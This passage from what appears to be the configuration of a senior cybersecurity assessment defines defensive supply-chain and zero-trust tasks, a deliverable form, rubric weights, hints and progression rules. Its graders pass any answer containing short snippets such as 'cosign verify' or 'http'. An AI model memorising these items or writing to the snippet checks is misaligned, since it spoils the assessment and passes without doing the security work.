        "Defines SLSA Level 3 build isolation and non-falsifiable provenance",
        "Includes Cosign cryptographic signature verification command (`cosign verify`)",
        "Integrates automated SBOM generation and blocking policy",
      ],
      skills: ["Supply Chain Security", "SLSA Framework", "Sigstore / Cosign", "SBOM", "CI/CD Security"],
      evidenceRequired: ["Cosign verification workflow YAML", "SLSA Level 3 compliance summary"],
      validationRules: [
        { id: "cyb-sen-t3-rule1", description: "Cosign verify command", type: "code_static", expectedSnippet: "cosign verify" },
        { id: "cyb-sen-t3-rule2", description: "SLSA Level 3 citation", type: "document_structure", expectedSnippet: "SLSA" },
      ],
      rubricWeight: 30,
      hints: ["Cosign verifies that the container image digest matches an immutable cryptographic signature signed by an approved OIDC identity."],
      timeEstimateMins: 30,
    },
  ],
  deliverable: {
    type: "Incident Triage Report (PDF) + Security Remediation Patch",
    description: "Submit comprehensive Zero-Trust Architecture Blueprint, Sigstore CI/CD policy, and payload analysis.",
    fields: [
      { name: "repoUrl", label: "Architecture & Policy Repo URL", type: "url", placeholder: "https://github.com/candidate/zero-trust-supply-chain-architecture", required: true, helpText: "Repository containing Zero-Trust architecture docs, Envoy configs, and Cosign workflows." },
      { name: "notes", label: "Zero-Trust Strategy & Reverse Engineering Write-up", type: "text", placeholder: "Paste your de-obfuscation analysis, SPIFFE/SPIRE egress design, and SLSA Level 3 controls...", required: true, helpText: "Include your decoded secret analysis and Cosign verification workflows." },
    ],
    validationRules: [
      { id: "deliv-cyb-sen-1", description: "URL format", type: "code_static", expectedSnippet: "http" },
    ],
  },
  rubric: [
    { id: "defense_in_depth", name: "Zero-Trust Architecture & SPIFFE/SPIRE", weight: 40, description: "Technical depth of egress proxy micro-segmentation, mTLS, and workload cryptographic identity.", criteria: ["Robust SPIFFE/SPIRE design", "Default-deny egress isolation", "Effective DNS firewall sinkholing"] },
    { id: "threat_identification", name: "Payload Reverse Engineering & Forensics", weight: 30, description: "Rigor of payload de-obfuscation and understanding of covert DNS tunneling channels.", criteria: ["Correct decoding of JWT secret", "Sound entropy analysis of DNS traffic"] },
    { id: "remediation_quality", name: "Supply Chain Security & SLSA Governance", weight: 30, description: "Effectiveness of automated Sigstore Cosign verification and SLSA Level 3 build provenance.", criteria: ["Functional Cosign workflow", "Actionable SBOM gating", "Comprehensive supply chain controls"] },
  ],
  hints: ["Ensure that the DNS firewall rule uses Response Policy Zones (RPZ) to return NXDOMAIN or sinkhole IPs for unauthorized external domains."],
  progression: {
    onSuccess: {
      recommendedTrack: "SD",
      recommendedLevel: "senior",
      rationale: "Candidate demonstrated elite cybersecurity architecture and systems defense. Cross-track advance: Senior Software Developer Distributed Locking & Concurrency.",
    },
    onRemediation: {
      recommendedTrack: "CYBER",
      recommendedLevel: "senior",
      targetSkill: "Zero-Trust Egress Architecture",
      rationale: "Study SPIFFE/SPIRE workload identities and Envoy service mesh filters before leading enterprise security architectures.",
    },
  },
};
